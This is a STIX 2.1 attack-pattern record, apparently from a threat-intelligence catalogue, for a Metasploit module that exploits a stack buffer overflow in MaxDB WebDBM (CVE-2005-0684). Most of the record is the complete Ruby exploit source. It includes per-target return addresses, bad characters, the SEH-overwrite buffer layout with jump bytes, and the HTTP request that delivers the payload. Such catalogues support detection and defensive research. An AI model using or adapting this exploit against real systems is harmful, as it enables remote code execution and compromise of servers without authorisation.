{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d4348d5-411f-41c8-a00a-5be2bec6beb3",
    "created": "2024-08-14T16:54:09.155361Z",
    "modified": "2024-08-14T16:54:09.155365Z",
    "name": "MaxDB WebDBM GET Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the MaxDB WebDBM service. This service is included with many recent versions of the MaxDB and SAPDB products. This particular module is capable of exploiting Windows systems through the use of an SEH frame overwrite. The offset to the SEH frame may change depending on where MaxDB has been installed, this module assumes a web root path with the same length as:  C:\\Program Files\\sdb\\programs\\web\\Documents ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/maxdb_webdbm_get_overflow.rb",
            "external_id": "maxdb_webdbm_get_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0684"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=234&type=vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MaxDB WebDBM GET Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the MaxDB WebDBM\n        service. This service is included with many recent versions\n        of the MaxDB and SAPDB products. This particular module is\n        capable of exploiting Windows systems through the use of an\n        SEH frame overwrite. The offset to the SEH frame may change\n        depending on where MaxDB has been installed, this module\n        assumes a web root path with the same length as:\n\n        C:\\Program Files\\sdb\\programs\\web\\Documents\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0684'],\n          [ 'OSVDB', '15816'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=234&type=vulnerabilities'],\n          [ 'BID', '13368'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2052,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x40\",\n          'StackAdjustment' => -3500,\n        },\n        'Platform'   => 'win',\n      'Targets'        =>\n        [\n          ['MaxDB 7.5.00.11 / 7.5.00.24', { 'Ret' => 0x1002aa19 }], # wapi.dll\n          ['Windows 2000 English',        { 'Ret' => 0x75022ac4 }], # ws2help.dll\n          ['Windows XP English SP0/SP1',  { 'Ret' => 0x71aa32ad }], # ws2help.dll\n          ['Windows 2003 English',        { 'Ret' => 0x7ffc0638 }], # peb magic :-)\n          ['Windows NT 4.0 SP4/SP5/SP6',  { 'Ret' => 0x77681799 }], # ws2help.dll\n        ],\n      'DisclosureDate' => '2005-04-26',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(9999)\n      ])\n  end\n\n  def exploit\n    # Trigger the SEH by writing past the end of the page after\n    # the SEH is already overwritten. This avoids the other smashed\n    # pointer exceptions and goes straight to the payload.\n    buf = rand_text_alphanumeric(16384)\n    buf[1586, payload.encoded.length] = payload.encoded\n    buf[3638, 5] = \"\\xe9\" + [-2052].pack('V')\n    buf[3643, 2] = \"\\xeb\\xf9\"\n    buf[3647, 4] = [target.ret].pack('V')\n\n    print_status(\"Trying target address 0x%.8x...\" % target.ret)\n\n    send_request_raw({\n      'uri' => '/%' + buf\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-04-26",
    "x_mitre_platforms": [
        "win'"
    ]
}